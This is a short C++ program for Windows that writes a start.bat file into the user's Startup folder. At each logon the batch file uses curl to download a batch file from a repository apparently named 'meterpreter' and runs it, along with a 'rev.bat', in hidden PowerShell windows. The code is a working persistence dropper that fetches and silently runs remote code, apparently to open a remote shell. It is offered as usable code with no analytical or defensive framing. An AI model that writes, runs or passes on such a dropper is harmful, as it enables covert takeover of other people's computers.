#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <shlobj.h> 

int main() {
    char startupFolderPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath) != S_OK) {
        std::cerr << "Error: Could not retrieve Startup folder path" << std::endl;
        return 1;
    }
    std::string filePath = std::string(startupFolderPath) + "\\start.bat";
    const std::string batcontent =
        "@echo off\n"
        "curl https://raw.githubusercontent.com/0x2034/meterpreter/main/nihbtdtdow.bat -o \"%temp%\\nihbtdtdow.bat\"\n"
        "powershell -WindowStyle Hidden -Command \"Start-Process -FilePath \\\"%temp%\\nihbtdtdow.bat\\\" -WindowStyle Hidden\""""
        "\npowershell -c \"Start-Process -FilePath \"%temp%\\rev.bat\" -WindowStyle Hidden\"";

    std::ofstream outFile(filePath);
    if (!outFile) {
        std::cerr << "Error: Could not create file " << filePath << std::endl;
        return 1;
    }
    outFile << batcontent;
    outFile.close();
    std::cout << "Bat file created successfully at " << filePath << std::endl;
    return 0;
}
